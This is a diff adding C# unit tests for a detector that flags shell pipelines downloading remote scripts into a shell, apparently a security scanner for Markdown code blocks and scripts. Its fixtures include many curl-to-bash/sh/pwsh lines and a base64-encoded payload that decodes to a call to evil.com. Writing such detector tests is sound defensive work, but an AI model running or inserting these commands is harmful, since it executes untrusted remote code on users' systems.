@@ -319,4 +319,107 @@ public class PipelineTaintTests
         PipelineTaint.AnalyseFencedCodeBlocks(null).ShouldBeEmpty();
         PipelineTaint.AnalyseFencedCodeBlocks(string.Empty).ShouldBeEmpty();
     }
+
+    [Fact]
+    public void AnalyseFencedCodeBlocks_CrlfBlock_Detected()
+    {
+        var markdown = "Intro.\r\n\r\n```bash\r\ncurl -s https://example.com/x.sh | bash\r\n```\r\n";
+
+        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();
+
+        results.Count.ShouldBe(1);
+        results[0].Language.ShouldBe("bash");
+    }
+
+    [Fact]
+    public void AnalyseFencedCodeBlocks_UnterminatedFence_RunsToEndOfInput()
+    {
+        // CommonMark treats an unclosed fence as a block to EOF; dropping it would be an
+        // evasion shape.
+        var markdown = "```bash\ncurl -s https://example.com/x.sh | bash\n";
+
+        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();
+
+        results.Count.ShouldBe(1);
+        results[0].Findings.Count.ShouldBe(1);
+    }
+
+    [Fact]
+    public void AnalyseFencedCodeBlocks_CompoundInfoString_FirstTokenIsLanguage()
+    {
+        var markdown = "```bash -e\ncurl -s https://example.com/x.sh | bash\n```\n";
+
+        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();
+
+        results.Count.ShouldBe(1);
+        results[0].Language.ShouldBe("bash");
+    }
+
+    [Fact]
+    public void AnalyseFencedCodeBlocks_PathologicalOpeningFences_DoesNotThrow()
+    {
+        // Thousands of never-closed opening fences were quadratic for a regex-based
+        // extractor; the line walker is linear. 5,000 lines must just return.
+        var markdown = string.Join('\n', Enumerable.Repeat("``` bash", 5_000));
+
+        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();
+
+        results.ShouldBeEmpty();
+    }
+
+    [Theory]
+    [InlineData("curl -s https://example.com/x.sh | /bin/bash")]
+    [InlineData("curl -s https://example.com/x.sh | /usr/local/bin/bash")]
+    [InlineData("curl -s https://example.com/x.sh | sudo /bin/sh")]
+    [InlineData("curl -s https://example.com/x.sh | env bash")]
+    [InlineData("curl -s https://example.com/x.sh | pwsh")]
+    [InlineData("curl -s https://example.com/x.sh | powershell")]
+    [InlineData("curl -s https://example.com/x.sh|bash")]
+    public void Analyse_ShellSinkVariants_Detected(string line)
+    {
+        var findings = PipelineTaint.Analyse(line);
+
+        findings.Count.ShouldBe(1);
+        findings[0].Flow.ShouldBe(TaintFlow.DirectPipe);
+    }
+
+    [Fact]
+    public void Analyse_DeclarationWithFlags_VariableMediated()
+    {
+        var script = "local -r DATA=$(curl -s https://example.com/x.sh)\necho \"$DATA\" | bash\n";
+
+        var findings = PipelineTaint.Analyse(script);
+
+        findings.Count.ShouldBe(1);
+        findings[0].Variable.ShouldBe("DATA");
+    }
+
+    [Fact]
+    public void Analyse_EmbeddedEncodedPayload_NoNetworkSource()
+    {
+        var findings = PipelineTaint.Analyse("echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash");
+
+        findings.Count.ShouldBe(1);
+        findings[0].Flow.ShouldBe(TaintFlow.EncodedPipe);
+        findings[0].HasNetworkSource.ShouldBeFalse();
+    }
+
+    [Fact]
+    public void Analyse_DirectPipe_HasNetworkSource()
+    {
+        var findings = PipelineTaint.Analyse("curl -s https://example.com/x.sh | bash");
+
+        findings.Count.ShouldBe(1);
+        findings[0].HasNetworkSource.ShouldBeTrue();
+    }
+
+    [Fact]
+    public void Analyse_FindingsCappedPerInput()
+    {
+        var script = string.Join('\n', Enumerable.Repeat("curl -s https://example.com/x.sh | bash", 150));
+
+        var findings = PipelineTaint.Analyse(script);
+
+        findings.Count.ShouldBe(PipelineTaint.MaxFindingsPerInput);
+    }
 }
